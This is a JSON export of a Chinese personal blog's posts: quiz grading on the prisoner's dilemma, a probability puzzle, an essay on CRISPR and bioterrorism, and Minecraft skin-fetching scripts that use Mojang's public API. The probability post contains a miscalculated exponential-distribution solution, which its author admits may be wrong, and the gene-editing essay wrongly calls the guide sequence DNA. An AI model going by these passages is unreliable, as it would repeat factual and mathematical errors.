尽管您的答案比那个没有谈论“低等人”和“统治者”，但您的逻辑与设计答案是非常接近的，而且成功达成了完全相同的效果——您强调了道德是对于许多亚种的统括概述，对于不同地位的人，道德是相当不同的东西。这成功地令尼采与马基雅维利的两句话谈论的东西，变成了虽写作“道德”，却不尽相同的事物，因而导致矛盾不复存在。这毫无疑问是惊艳而值得被给出满分的答案。 囚徒困境 #1我选择独吞。若我假设对方分享，则我应该独吞（100）或分享（50）；若我假设对方独吞，则我应该独吞（10）或分享（0）。选择独吞一定可以获利。这是从概率角度分析，并不代表真实情况，只是为了符合题设。 (3)【指出最佳选择是独吞】 推理清晰，结果明了，尽管这道题有许多人拿到满分，但即使在所有拿到满分的人中，您的答案也是最好的之一！ 囚徒困境 #2自游戏开始便始终选择合作。若对方独吞已到两次，则后始终选择独吞。 (3)【指出更好的策略包括了对背叛的惩罚和合作的倾向】 您的答案是正确的！这道题存在许多比永远独吞更好的策略，它们的特点几乎总是惩罚背叛，并倾向合作。之所以独吞不再站得住脚，是因为支持第一题中独吞的理由（选择独吞的收益永远高于分享）在长期博弈中分崩离析。让我们仔细看看这是为何： 在单次博弈中，选择独吞的收益永远高于分享。但是长期而不知何时结束的博弈并非如此。这是因为“名誉”和“惩罚”这两个要素的存在。举例而言，假设您的对手采用如下策略：一开始选择分享，只要您分享便继续分享，一旦您背叛便立刻背叛（您事实上不知道对方的策略，即使对方和您沟通好了，对方也有反悔的余地，但是这个策略是个非常合理的猜测）。假设现在是游戏中途的某一回合，在上一回合双方都选择了分享，其中的玩家该如何决策呢？ 假设继续合作，玩家每回合的收益都是50万，也就是50万*预期回合数，根据题意，预期回合数极多，且不随着游戏的进行而减少。 假设停止合作，玩家第一回合收入为100万，然后为10万，也就是100万 + 10万*（预期回合数-1）。显然，只消三回合，玩家收入就会被合作策略反超。因此，显然合作是胜于独吞的。 因为游戏的回合数是如此众多，双方合作带来的潜在收益远远地超过了在某一回合（包括第一回合）背叛带来的区区50万收益。因此，通常而言，可以期待对方在第一回合便选择合作。（在您这里，沟通加强了这一点，双方都能期待对方在第一回合合作）至此，我们得出了这样一个结论：主动提出合作，并且惩罚不合作的对方，是比一直背叛更好的策略。 事实上，目前我们所知的最好的策略如下：第一回合合作，第二回合开始，若对方上一回合合作，则继续合作。若对方上一回合背叛，则大概率背叛，小概率合作。翻译成白话，即：大气地提出交易，宽容地原谅对方，给对方悔过的机会，然后惩罚对方的背叛。这正是宽容，善良的理论基础。一个人的名声，比赛将长期持续下去的保障，这两者一旦存在，便会产生如此的结果。这正是新哈莫尼的立身之本（之一）. 这些问题的答案，解释了为什么我们采用公有制及社区制度，不换周目，并且高度鼓励生电。 多出来的两分的评分标准如下：若正确的提到了本题的逻辑是社区中住民诚信，善良等美德的理性基础，则额外加2分。这属于附加分数，不计入常规分数。 附加题 囚徒困境 #3这是对人心的考验，但我不忍心把这当成经济学的题目做，而假设每个人都是贪婪的，每一步选择都是为了获利。我会坚持我之前的答案。 (0)【本题不计入常规得分】 采用Backward Induction，做出如下推理。 首先，考虑最后一回合。最后一回合实际上和一个常规单回合囚徒困境是完全一致的，因此双方必定背叛。 接着考虑倒数第二回合。因为每个玩家都猜到了对方最后一回合会背叛，他们做什么都无法改变最后一回合的结局（也即惩罚不再具有意义）。因此，这又成为了一个独立的单回合囚徒困境，双方必定背叛。 倒数第三，第四回合亦然。一直回到第一回合，所有人都会选择背叛。因此一直背叛是此类博弈的均衡。 结语 您差一点就要得到18分了，而即使是除开附加题，您的分数也达到了15分之多。也就是说，在所有常规题中，您获得了全部的分钟，事实上，这便是这套题设计的满分。您是服务器第一位得到满分的玩家，我会好好记住您的，感谢您的答卷！","link":"/d620330e1ada/"},{"title":"朋友给的一道概率题","text":"引子今天在某学校的校群里看见一个问题等着求解。题面大概是这样的： 某公交车站在上午$10$时至$11$时之间有一辆公交车经过。求上午$10$时$30$分时刻，公交车经过的概率为多少？ 指数分布刚开始我还给这题唬住了，思考了一会儿后觉得应该用指数分布得到概率函数。然后给出了接下来的解法： $解:,由指数分布数学期望, 得\\frac{1}{\\lambda}=\\frac{1}{1}. 解得\\lambda =1.$ $\\qquad 代入\\lambda 得P{T\\leq t}=F(t)=1-e^{-\\lambda t}=1-e^{-t}.$ $\\qquad 当t=0.5时, P(t)=1-e^{-1}\\approx 63.21%.$ 如果把图像作出来，是长这样： 能看出来问题。每个时刻都应该只有来或不来两种情况，刚开始的时候不应该如此接近$0$啊。所以我们不应该使用指数分布。 古典概型和几何概型古典概型可以用于样本容量有限、情况为有限个、且每种情况等可能时用于计算概率。但如果有一个圆作为范围，如果向有限平面中任意丢硬币，进入范围计数，此时虽然样本容量有限、情况等可能，但硬币丢入的位置只是点，不占面积。此时便有无穷种可能，不可以使用古典概型，此类解决方法叫做几何概型。对于此处的来车问题，每个时刻车来或不来的概率是相同的，但对于整体来说，此处的概率还和开始以来是否有车经过相关，因此此处也有无穷种可能，可以用几何概型概括。 在此情况中，由于有无数多个时刻（瞬间），因此每个时刻来车的概率为$0$。 如果改为区间呢？如果把题目中的$10:30$时刻改为$10:30$至$10:31$区间的一分钟，那么此处的概率如何计算？听起来很唬人，但是此处的数学期望就是$1$小时来$1$次车，因此每分钟的概率都相等，等于$\\frac{1}{60}$。 有更好的解决方法或答案？上述除题面外的所有解释都可以当作我一派胡言，不用太过在意，我自己目前也对结果不满意。在此，我向各位征集想法，此题具体应该如何解决。可以向我投稿你的想法，电子邮件或下方评论皆可。诸君，这辆车实在是太烦人了。","link":"/7f92875a6456/"},{"title":"浅谈基因编辑","text":"引子基因编辑 (Genome Editing), 又称基因组工程, 是遗传工程的一种, 指在活体基因组中进行 DNA 插入, 删除, 修改或替换的一项技术. 例如, 通过修改蚊子种群的 DNA, 使其不再具有携带如寨卡病毒等致病病原体的能力. 早期的遗传工程技术1970 年, 出现了用基因工程将新的遗传成分引入生物的方法, 该技术缺憾在于 DNA 插入基因组时是随机的, 有可能损害或改变生物体内的其他基因, 因此需要寻找将插入的基因精确地靶向生物基因组内特定位点的方法. 基因编辑与早期的遗传工程技术相比, 不同之处在于: 早期的遗传工程技术是在宿主的基因或基因组中进行随机插入基因物质, 而基因编辑是在特定位置插入基因片段. 通过将突变靶向特定基因, 可以将其用于研究和基因治疗. 通过将一种功能基因插入生物体并靶向其以替代有缺陷的基因, 有望治愈某些遗传疾病. 已成功的技术突破基因敲落和剔除基因敲落 (Gene Knockdown) 是指一种遗传工程技术, 其针对某功能未知的已知序列, 改变生物的遗传基因, 令特定的基因功能下降, 从而使部分功能丧失或者减低, 并且可以进一步对生物体造成影响, 进而推测出该基因的生物学功能.基因敲洛技术延申出的基因剔除 (Gene Knock-out) 同是一种遗传工程技术, 其指利用外源已突变的基因替换内源正常同源基因的方法, 可使内源基因失活而表现突变体的性状. 1987 年, 美科学家马里奥·卡佩奇与英科学家奥利弗·史密斯成功构建小鼠基因剔除技术 (他们因为这一成就于 2007 年同小鼠干细胞分离技术创始人马丁·埃文斯分享了当年的诺贝尔生理学或医学奖. ) CRISPRCRISPR *(Clustered Regularly Interspaced Short Palindromic Repeats, 常间回文重复序列丛集)* 是存在于细菌中的一种基因, 该类基因组中含有曾经攻击过该细菌的病毒的基因片段. 细菌透过这些基因片段来侦测并抵抗相同病毒的攻击, 摧毁其 DNA. 这类基因组是细菌免疫系统的关键组成部分. 透过这些基因组, 人类可以准确且有效地编辑生命体内的部分基因. 也就是 CRISPR/Cas9 基因编辑技术.CRISPR/Cas 系统 *(Clustered Regularly Interspaced Short Palindromic Repeats/CRISPR-associated proteins, 常间回文重复序列丛集/常间回文重复序列丛集关联蛋白系统)* , 为目前发现存在于多数细菌与绝大多数的古菌中的一种后天免疫系统, 以消灭外来的质粒或者噬菌体, 并在自身基因组中留下外来基因片段作为”记忆”. 目前已经发现三种不同类型的 CRISPR/Cas 系统, 存在于 40% 已定序的细菌和 90% 已定序的古菌中.通过人工核酸酶 (包括 ZFNs, TALEN 和 CRISPR/Cas9) 进行基因编辑的技术被 Nature 选为 2011 年年度技术. CRISPR/Cas9 技术也被 Science 选为 2015 年度重要技术突破. Cas9 与 Cpf1Cas9 *(CRISPR associated protein 9, CRISPR 关联蛋白质 9)* 是第一个被广泛应用的 CRISPR 核酸酶, 被大量应用于基因工程. 2020年，美科学家珍妮弗·道德纳与法科学家埃玛纽埃勒·沙尔庞捷因对 CRISPR/Cas9 的研究而获得了当年的诺贝尔化学奖. Cpf1 (CRISPR associated protein 12a, CRISPR 关联蛋白质 12a, 即 Cpf1), 其在新泽西弗朗西斯菌的 CRISPR/Cpf1 系统中被发现. Cas12a and Cas9 have striking functional similarities despite having evolved through independent pathways, with similar sizes (1368 amino acids for SpCas9; 1307 for FnCas12a). They are both multidomain effector proteins and adopt a bilobed architecture when in complex with their respective RNAs. (Cas12a 和 Cas9 尽管通过独立的途径进化, 但具有惊人的功能相似性, 具有相似的大小 (SpCas9 为 1368 个氨基酸; Cas12a 为 1307 个氨基酸). )Cas9 requires two RNA molecules: tracrRNA and a crRNA, whereas Cas12a requires only a single RNA molecule, the crRNA. (Cas9 需要两个 RNA 分子: tracrRNA 和一个 crRNA, 而 Cas12a 只需要一个 RNA 分子, 即 crRNA. ) 基于核酸内切酶的基因编辑系统是由一个分子”剪刀” (如 Cpf1) 和一个由 DNA 构成的引导序列组成的. 由 DNA 构成的引导序列会引领分子”剪刀”与靶向序列的 DNA 结合, 使得靶向序列被切除.Cas9 需要 2 条 RNA 分子来做 DNA 的剪切. 然而, Cpf1 只需要 1 条. Cas9 蛋白在切割 DNA 双链时, 两条链上的切口在两链的相同位置上, 所以留下的末端是平末端. Cpf1 蛋白则不同, 其在 DNA 两条链上的切割位点不在同一位置上, 因此会产生粘性末端. 由于粘性末端的缘故, 在 Cpf1 酶切末端上插入新序列比 Cas9 的酶切末端上更容易.Cpf1 只需要 1 个 RNA 序列来导引, 并且不需要 tracrRNA. 由于 Cpf1 蛋白是一种比 Cas9 蛋白更小而且更简单的核酸内切酶, 这样把 CRISPR/Cpf1 系统植入待修改基因的细胞就相对更容易, CRISPR/Cpf1 可能是一种比 CRISPR/Cas9 更好的基因编辑工具. 反话生物恐怖主义生物恐怖主义 (Bioterrorism) 是恐怖主义涉及有意释放或传播的生物制剂 (细菌、病毒，昆虫，真菌或毒素), 与生物战中的方式大致相同. 这可能会对自然或人类有害. A biological attack, or bioterrorism, is the intentional release of viruses, bacteria, or other germs that can sicken or kill people, livestock, or crops. (生物恐怖袭击指的是故意释放出病毒, 细菌或其他微生物 (称为生物制剂), 以达到使人类, 动物或植物致病致死的目的. ) 一战爆发时, 德国在美国, 俄罗斯, 罗马尼亚和法国发起了一次生物破坏活动, 但并未成功. 1916 年, 俄国人逮捕了具有类似意图的德国特工. 1972 年, 芝加哥警方逮捕了两名大学生, 他们计划用伤寒和其他细菌毒害城市的供水系统. 两人被保释后逃到古巴, 其中一人在 1974 年死亡, 另一人在 1975 年返回美国并受到缓刑. 1980 年, 世界卫生组织宣布消除天花, 这是一种具有高度传染性和不可治愈的疾病. 由于疫苗接种计划现已终止, 世界人口比以往任何时候都更容易受到天花的感染. 2001 年 9 月 18 日起, 含有炭疽杆菌的信件被寄给数个新闻媒体办公室以及两名民主党参议员. 此事件导致 5 人死亡, 17 人被感染. 事件持续数周, 直到 2008 年, 最主要的嫌疑人才被公布. 嫌疑人布鲁斯·爱德华兹·艾文斯曾经在马里兰州弗雷德里克德特里克堡政府生物防御实验室中工作. 艾文斯得知将被逮捕后于当年 7 月 27 日服用大量对乙酰氨基酚自杀. 同年 8 月 6 日, 美国联邦调查局宣布艾文斯为唯一嫌疑犯. 生物武器 (Biological Weapon) 可以通过弹头, 喷雾器, 气溶胶发生器等施放. 袭击人的生物武器一般具有下列特征: 感染剂量低, 毒性高. 潜伏期一般较短, 发病率高. 具有高度传染性. 可通过多种途径, 尤其是通过呼吸道途径致人感染或中毒. 造成失能或死亡的几率高. 缺乏有效的预防和治疗措施, 如免疫血清, 疫苗或抗菌素. 在环境中稳定性一般较高. (在早期) 难以检测或鉴定. 易于生产和运输. 因此, 已知被发展, 生产, 储存或用作生物武器的病原微生物及其产物种类就成为生物恐怖袭击的首选之物. 基因编辑婴儿事件2018 年, 中国南方科技大学生物系副教授贺建奎及其团队通过 CRISPR/Cas9 等基因编辑技术, 对一对双胞胎婴儿胚胎细胞的 CCR5 基因进行改造, 尝试使婴儿获得对部分艾滋病具备免疫能力. 2018 年 11 月 25 日, 贺建奎团队通过视频形式公布并接受美联社的专访. 次日, 人民网记者吕绍刚, 陈育柱报道并富有正面评价, 随后引发广泛争议.基因编辑婴儿本身涉及仍未解决的伦理和技术问题. 中国国内有过百名科学家联署反对. 人民网随后删除吕绍刚等的报导, 并刊出一篇批评贺建奎的社评.中国科技部于隔日宣布暂停贺建奎的科研活动, 中国国家卫健委, 广东省人民政府, 深圳市人民政府等已就事件展开调查. 2019 年 12 月 30 日, 基因编辑婴儿事件在深圳市南山区人民法院一审公开宣判. 贺建奎以非法行医罪为由被判有期徒刑三年, 并处罚金人民币三百万元. 美国科学家乔治·丘奇对实验目标给出了正面评价: “考虑到 HIV 对全球公共健康的威胁有扩大的趋势，我认为贺建奎选择了一个非常好的目标基因.” 在技术上, 丘奇指出”这几乎就像没有编辑一样”, 因为如果只有一个基因被改变, 那么 HIV 感染仍然会发生. 他在伦理方面质疑说, 该胚胎的使用表明, 研究人员的”主要重点是测试基因编辑技术, 而不是避免这种疾病”. 丘奇同意有关贺建奎此项实验不够透明, 之前没有足够的初步实验并让同行进行评审的批评. 结语生物学的发展伴随着愈强的挑战. 以现有的技术, 恐怖主义可能利用生物武器发起大规模无差别攻击. 随着基因编辑技术的发展, 或许未来恐怖主义的目标将定位于修改或损坏人类的 DNA 上. 甚至有可能实现科幻小说中的通过 DNA 识别特定目标, 在人群中精确打击目标. 我们不应为这些担忧而停止生物学的发展. 目前, 仍存在比生物武器更直接更简易的打击方式: 核武器 (Nuclear Weapon), 放射性武器 (Radiological Warfare) 和化学武器 (Chemical Weapon). 这些大规模杀伤性武器用于大规模范围屠杀及破坏毁灭, 针对的目标不一定局限于特定军队及人民, 具严重毁灭与不可逆性. 一旦轻率使用, 就会遭到强烈的国际谴责, 制裁和对地球生物环境造成灾难性后果. 1945 年 8 月 6 日, 美国在日本广岛投掷核武器”小男孩”, 截止当年年底共造成 14 万平民罹难, 广岛遭受极大的破坏. 1945 年 8 月 9 日, 美军在日本长崎投掷核武器”胖子”, 战后估计死者 15 万人, 约占当时长崎市人口的 62%. 广岛和长崎成为世界迄今仅有的两个被核武器攻击的城市. 目前, 《核不扩散条约》, 《禁止化学武器公约》与《禁止生物武器公约》成为限制大规模杀伤性武器的国际条约. 愿基因编辑成为人类免疫疾病的方式. 参考文献著录格式参照 GB/T 7714－2015《信息与文献 参考文献著录规则》. 维基百科中文 维基百科编者. 基因编辑技术[G/OL]. 维基百科, 2021(20210416)[2021-04-16]. https://zh.wikipedia.org/wiki/基因编辑技术. 维基百科编者. 基因敲落[G/OL]. 维基百科, 2020(20200223)[2020-02-23]. https://zh.wikipedia.org/wiki/基因敲落. 维基百科编者. 基因剔除[G/OL]. 维基百科, 2020(20200223)[2020-02-23]. https://zh.wikipedia.org/wiki/基因剔除. 维基百科编者. CRISPR[G/OL]. 维基百科, 2021(20210330)[2021-03-30]. https://zh.wikipedia.org/wiki/CRISPR. 维基百科编者. Cas9[G/OL]. 维基百科, 2021(20210320)[2021-03-20]. https://zh.wikipedia.org/wiki/Cas9. 维基百科编者. CRISPR/Cpf1[G/OL]. 维基百科, 2021(20210511)[2021-05-11]. https://zh.wikipedia.org/wiki/CRISPR/Cpf1. 维基百科编者. 生物恐怖主義[G/OL]. 维基百科, 2020(20201227)[2020-12-27]. https://zh.wikipedia.org/wiki/生物恐怖主義. 维基百科编者. 2001年美國炭疽攻擊事件[G/OL]. 维基百科, 2021(20210708)[2021-07-08]. https://zh.wikipedia.org/wiki/2001年美國炭疽攻擊事件. 维基百科编者. 基因编辑婴儿事件[G/OL]. 维基百科, 2021(20210623)[2021-06-23]. https://zh.wikipedia.org/wiki/基因编辑婴儿事件. 维基百科编者. 大规模杀伤性武器[G/OL]. 维基百科, 2021(20210618)[2021-06-18]. https://zh.wikipedia.org/wiki/大规模杀伤性武器. 维基百科编者. 广岛市原子弹爆炸[G/OL]. 维基百科, 2021(20210806)[2021-08-06]. https://zh.wikipedia.org/wiki/广岛市原子弹爆炸. 维基百科编者. 長崎市原子彈爆炸[G/OL]. 维基百科, 2021(20210812)[2021-08-12]. https://zh.wikipedia.org/wiki/長崎市原子彈爆炸. 英文 Wikipedia contributors. Bruce Edwards Ivins[G/OL]. Wikipedia, 2021(20210628)[2021-06-28]. https://en.wikipedia.org/wiki/Bruce_Edwards_Ivins. 论文, 期刊或官方公告 Marcy Gallo, Amanda Sarata, John Sargent, Tadlock Cowan. Advanced Gene Editing: CRISPR-Cas9. Congressional Research Service, 2018(20181207)[2018-12-07]. https://crsreports.congress.gov/product/pdf/R/R44824 Bijoya Paul, Guillermo Montoya. CRISPR-Cas12a: Functional overview and applications[J/OL]. ScienceDirect, 2020(20200205)[2020-02-05]. https://doi.org/10.1016/j.bj.2019.10.005 CDC. Anthrax as a Bioterrorism Weapon[EB/OL]. CDC, 2020(20201120)[2020-11-20]. https://www.cdc.gov/anthrax/bioterrorism/index.html","link":"/d4e3515d2702/"},{"title":"激励栏改为爱发电入口啦","text":"各位看官，本站终于入驻爱发电啦！ 今后的激励栏也从原先的微信支付宝入口改为爱发电入口啦， 原本长这样哦。 网站的维护既需要时间成本，又需要经济成本，目前博客每月的经济成本约为 6 元。觉得内容优质、有用的兄弟们还请多支持啊。","link":"/403eb398f481/"},{"title":"获取Minecraft正版玩家皮肤","text":"引子前段日子和朋友玩Hypixel的时候，朋友问我能不能把某个玩家的皮肤给下载下来私用。我当时使用了NameMC获取玩家皮肤，但后来用来获取玩家的UUID时，发现有些玩家没办法搜到。这也就催生了我去寻找远古方法，直接通过Mojang服务器获取玩家皮肤、UUID等信息的想法。 原理阐释首先，我们通过Mojang提供的官方API（api.mojang.com/users/profiles/minecraft/[ID]）获取玩家的UUID。对应填入玩家ID，访问后就可以获取一段对应的JSON，格式大概如下： JSON1{&quot;name&quot;:&quot;XavierWah&quot;,&quot;id&quot;:&quot;0be6e8232e5f4cb198320792b0da9188&quot;} 很明显可以看出，这段信息中键name为玩家ID，键id为玩家UUID。玩家的UUID就到手后，我们可以通过Session Server（sessionserver.mojang.com/session/minecraft/profile/[UUID]）获取到玩家的材质信息，同样是一段JSON，格式大概如下： JSON12345678{ &quot;id&quot; : &quot;0be6e8232e5f4cb198320792b0da9188&quot;, &quot;name&quot; : &quot;XavierWah&quot;, &quot;properties&quot; : [ { &quot;name&quot; : &quot;textures&quot;, &quot;value&quot; : &quot;ewogICJ0aW1lc3RhbXAiIDogMTYyNzI5Mjk3NDkwMCwKICAicHJvZmlsZUlkIiA6ICIwYmU2ZTgyMzJlNWY0Y2IxOTgzMjA3OTJiMGRhOTE4OCIsCiAgInByb2ZpbGVOYW1lIiA6ICJYYXZpZXJXYWgiLAogICJ0ZXh0dXJlcyIgOiB7CiAgICAiU0tJTiIgOiB7CiAgICAgICJ1cmwiIDogImh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvN2NiMzkxMTdhN2U4ZmYxYjE0M2VmMGU4YzRiMDg5MjA0ZTk3YTBlNmQwMGRjZjRlNjkxYWFmODlmNzhkOWQzMSIsCiAgICAgICJtZXRhZGF0YSIgOiB7CiAgICAgICAgIm1vZGVsIiA6ICJzbGltIgogICAgICB9CiAgICB9CiAgfQp9&quot; } ]} 这段里我们需要的信息，就是此处键value的值。这是一段经过Base64加密后的信息，解密后仍是一段JSON，格式大概如下： JSON12345678910111213{ &quot;timestamp&quot; : 1627294093042, &quot;profileId&quot; : &quot;0be6e8232e5f4cb198320792b0da9188&quot;, &quot;profileName&quot; : &quot;XavierWah&quot;, &quot;textures&quot; : { &quot;SKIN&quot; : { &quot;url&quot; : &quot;http://textures.minecraft.net/texture/7cb39117a7e8ff1b143ef0e8c4b089204e97a0e6d00dcf4e691aaf89f78d9d31&quot;, &quot;metadata&quot; : { &quot;model&quot; : &quot;slim&quot; } } }} 此处的timestamp为我们访问网站时的时间戳，SKIN中键url的值代表玩家皮肤的网址、键model的值代表玩家皮肤的种类（这个键不一定存在，但纤细一定是slim）。访问这个网址，就得到了玩家的皮肤。人工操作起来很复杂，需要辗转多次才能得到最终结果，并且中途还需要进行一次Base64解码，于是我便写了一个程序来帮助我获取玩家信息。 代码解剖 下载 skinFetcher.py 下方的代码。 Python 312345678910111213141516171819import requestsimport base64import jsonusername = input('输入要获取皮肤玩家ID：').split()[0]# 获取用户 UUIDapiWeb = requests.get('https://api.mojang.com/users/profiles/minecraft/{}'.format(username)).contentuseruuid = json.loads(apiWeb)['id']# 获取用户信息对应 Base64sessionWeb = requests.get('https://sessionserver.mojang.com/session/minecraft/profile/{}'.format(useruuid)).contentuserbase = json.loads(sessionWeb)['properties'][0]['value'].encode('utf-8')# 解码 Base64 并下载用户皮肤userskin = json.loads(base64.b64decode(userbase))['textures']['SKIN']['url']fetch = open('{}.png'.format(username), 'wb').write(requests.get(userskin).content)input('已保存至同级目录下，按回车键退出。') 由于有些人没有装Python，所以我又用Powershell写了一个功能一样的。 下载 skinFetcher.ps1 下方的代码。 Powershell123456789101112131415$username = Read-Host '输入要获取皮肤玩家ID'# 获取用户 UUID$apiWeb = ( Invoke-WebRequest -Uri ( 'https://api.mojang.com/users/profiles/minecraft/' + $username ) ).Content$useruuid = ( $apiWeb | ConvertFrom-Json ).id# 获取用户信息对应 Base64$sessionWeb = ( Invoke-WebRequest -Uri ( 'https://sessionserver.mojang.com/session/minecraft/profile/' + $useruuid ) ).Content$userbase = ( $sessionWeb | ConvertFrom-Json ).properties.value# 解码 Base64 并下载用户皮肤$userskin = ( ( [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($userbase)) ) | ConvertFrom-Json ).textures.SKIN.urlInvoke-WebRequest $userskin -OutFile ( ($pwd).Path + '\\' + $username + '.png' )Read-Host '已保存至同级目录下，按回车键退出。' 以上代码的逻辑和我们人工操作是一个流程。运行程序之后，直接根据提示输入玩家ID即可，皮肤会自动下载到运行目录中。","link":"/80ca1653686e/"},{"title":"评论功能上线啦","text":"各位看官，本站终于支持评论了！ 本站评论系统使用Gitalk，使用Github账号即可登录发表评论！ 快来这页底部试试看新的留言系统吧！","link":"/60593f3a3329/"},{"title":"起点","text":"嗨嗨，这里是XavierWah的庇护所，也就是我的个人博客。Minecraft和程序设计等内容将会成为庇护所的主要更新内容，偶尔也会上传文学创作的作品。截至现在，我终于将所有内容都配置好了。今后我会在这个博客更新一些内容、发布源码等，希望可以多加关注，在这里找到你需要的内容。永远好奇，别处见。","link":"/f54e82e2ba1c/"}],"tags":[{"name":"Biology","slug":"Biology","link":"/tags/Biology/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Socket","slug":"Socket","link":"/tags/Socket/"},{"name":"Minecraft","slug":"Minecraft","link":"/tags/Minecraft/"},{"name":"Announcement","slug":"Announcement","link":"/tags/Announcement/"},{"name":"Mathematics","slug":"Mathematics","link":"/tags/Mathematics/"},{"name":"Literature","slug":"Literature","link":"/tags/Literature/"},{"name":"Cryptography","slug":"Cryptography","link":"/tags/Cryptography/"},{"name":"Physics","slug":"Physics","link":"/tags/Physics/"},{"name":"Philosophy","slug":"Philosophy","link":"/tags/Philosophy/"},{"name":"History","slug":"History","link":"/tags/History/"},{"name":"Powershell","slug":"Powershell","link":"/tags/Powershell/"}],"categories":[{"name":"Science","slug":"Science","link":"/categories/Science/"},{"name":"Coding","slug":"Coding","link":"/categories/Coding/"},{"name":"Minecraft","slug":"Minecraft","link":"/categories/Minecraft/"},{"name":"Announcement","slug":"Announcement","link":"/categories/Announcement/"},{"name":"Literature","slug":"Literature","link":"/categories/Literature/"}]}